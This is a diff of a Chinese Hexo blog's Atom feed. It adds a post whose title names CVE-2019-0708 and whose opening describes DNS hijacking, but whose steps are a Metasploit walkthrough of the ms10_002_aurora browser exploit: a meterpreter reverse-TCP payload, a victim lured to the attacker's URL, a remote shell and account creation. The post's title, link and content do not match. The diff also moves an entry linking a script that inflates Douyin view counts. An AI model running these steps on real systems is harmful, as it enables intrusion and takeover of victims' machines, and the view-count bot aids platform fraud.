@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-09-07T08:23:46.055Z</updated>
+  <updated>2019-09-23T09:28:45.464Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>cve-2019-0708漏洞复现</title>
+    <link href="http://yoursite.com/2019/09/23/DNS%E5%8A%AB%E6%8C%81/"/>
+    <id>http://yoursite.com/2019/09/23/DNS劫持/</id>
+    <published>2019-09-23T12:29:32.000Z</published>
+    <updated>2019-09-23T09:28:45.464Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h1><p>访问一个网站，输入域名，正常DNS服务器返回该域名的IP，而DNS劫持后，会返回一个运营商额中间服务器IP，该访问服务器会一致性的返回302，让用户浏览器跳转到预处理好的带广告的网页，在该网页中再通过iframe打开用户原来访问的地址</p><h1 id="配置网络地址"><a href="#配置网络地址" class="headerlink" title="配置网络地址"></a>配置网络地址</h1><p>ifconfig eth0 192.168.56.133/24 (临时生效，重启生效)</p><h1 id="开启工具"><a href="#开启工具" class="headerlink" title="开启工具"></a>开启工具</h1><p>msfconsole</p><h1 id="查找10-002漏洞模块"><a href="#查找10-002漏洞模块" class="headerlink" title="查找10-002漏洞模块"></a>查找10-002漏洞模块</h1><p>search 10-002<br>use exploit/windows/browser/ms10_002_aurora 进行漏洞攻击<br>set payload windows/meterpreter/reverse_tcp 定义攻击载荷<br>set lhost 192.168.48.123 定义本机地址<br>set URIPATH / 定义url的后缀（这里我只设置了一个/）<br>exploit 开发</p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>在肉鸡上打开目标网站<a href="http://192.168.56.133:8080/" target="_blank" rel="noopener">http://192.168.56.133:8080/</a></p><h1 id="成功提权"><a href="#成功提权" class="headerlink" title="成功提权"></a>成功提权</h1><p>sessions -i 1 打开连接会话<br>session 查看已经成功获取的会话，使用session -i 连接到指定序号的meterpreter会话已继续利用<br>通过shell 获取目标主机的远程命令行<br>通过DOS创建账号与密码</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;利用原理&quot;&gt;&lt;a href=&quot;#利用原理&quot; class=&quot;headerlink&quot; title=&quot;利用原理&quot;&gt;&lt;/a&gt;利用原理&lt;/h1&gt;&lt;p&gt;访问一个网站，输入域名，正常DNS服务器返回该域名的IP，而DNS劫持后，会返回一个运营商额中间服务器IP，该访问服务器会一
+      
+    
+    </summary>
+    
+      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
+    
+    
+      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>cve-2019-0708漏洞复现</title>
@@ -275,31 +300,6 @@
   </entry>
   
   <entry>
-    <title>Python脚本</title>
-    <link href="http://yoursite.com/2019/08/31/python%E5%88%B7%E6%8A%96%E9%9F%B3%E8%AE%BF%E9%97%AE/"/>
-    <id>http://yoursite.com/2019/08/31/python刷抖音访问/</id>
-    <published>2019-08-31T07:29:32.000Z</published>
-    <updated>2019-08-31T14:31:41.546Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="Python脚本抖音刷视频播放量"><a href="#Python脚本抖音刷视频播放量" class="headerlink" title="Python脚本抖音刷视频播放量"></a>Python脚本抖音刷视频播放量</h1><p>粘贴抖音链接，回车键挂机刷即可，因为是线程刷CPU会占用比较高</p><h1 id="链接地址"><a href="#链接地址" class="headerlink" title="链接地址"></a>链接地址</h1><p><a href="https://www.lanzous.com/i4w9m3a" target="_blank" rel="noopener">https://www.lanzous.com/i4w9m3a</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;Python脚本抖音刷视频播放量&quot;&gt;&lt;a href=&quot;#Python脚本抖音刷视频播放量&quot; class=&quot;headerlink&quot; title=&quot;Python脚本抖音刷视频播放量&quot;&gt;&lt;/a&gt;Python脚本抖音刷视频播放量&lt;/h1&gt;&lt;p&gt;粘贴抖音链接，回车键挂机刷即
-      
-    
-    </summary>
-    
-      <category term="资源" scheme="http://yoursite.com/categories/%E8%B5%84%E6%BA%90/"/>
-    
-    
-      <category term="共享" scheme="http://yoursite.com/tags/%E5%85%B1%E4%BA%AB/"/>
-    
-  </entry>
-  
-  <entry>
     <title>卸载工具</title>
     <link href="http://yoursite.com/2019/08/31/%E5%8D%B8%E8%BD%BD%E5%B7%A5%E5%85%B7%E5%AE%8C%E5%85%A8%E4%B8%8D%E7%95%99%E4%B8%8B%E7%97%95%E8%BF%B9/"/>
     <id>http://yoursite.com/2019/08/31/卸载工具完全不留下痕迹/</id>
@@ -313,6 +313,31 @@
       
       
         &lt;h1 id=&quot;最强卸载工具-真正彻底不留垃圾&quot;&gt;&lt;a href=&quot;#最强卸载工具-真正彻底不留垃圾&quot; class=&quot;headerlink&quot; title=&quot;最强卸载工具 真正彻底不留垃圾&quot;&gt;&lt;/a&gt;最强卸载工具 真正彻底不留垃圾&lt;/h1&gt;&lt;p&gt;Windows 在卸载软件时总是不够
+      
+    
+    </summary>
+    
+      <category term="资源" scheme="http://yoursite.com/categories/%E8%B5%84%E6%BA%90/"/>
+    
+    
+      <category term="共享" scheme="http://yoursite.com/tags/%E5%85%B1%E4%BA%AB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Python脚本</title>
+    <link href="http://yoursite.com/2019/08/31/python%E5%88%B7%E6%8A%96%E9%9F%B3%E8%AE%BF%E9%97%AE/"/>
+    <id>http://yoursite.com/2019/08/31/python刷抖音访问/</id>
+    <published>2019-08-31T07:29:32.000Z</published>
+    <updated>2019-08-31T14:31:41.546Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Python脚本抖音刷视频播放量"><a href="#Python脚本抖音刷视频播放量" class="headerlink" title="Python脚本抖音刷视频播放量"></a>Python脚本抖音刷视频播放量</h1><p>粘贴抖音链接，回车键挂机刷即可，因为是线程刷CPU会占用比较高</p><h1 id="链接地址"><a href="#链接地址" class="headerlink" title="链接地址"></a>链接地址</h1><p><a href="https://www.lanzous.com/i4w9m3a" target="_blank" rel="noopener">https://www.lanzous.com/i4w9m3a</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;Python脚本抖音刷视频播放量&quot;&gt;&lt;a href=&quot;#Python脚本抖音刷视频播放量&quot; class=&quot;headerlink&quot; title=&quot;Python脚本抖音刷视频播放量&quot;&gt;&lt;/a&gt;Python脚本抖音刷视频播放量&lt;/h1&gt;&lt;p&gt;粘贴抖音链接，回车键挂机刷即
       
     
     </summary>
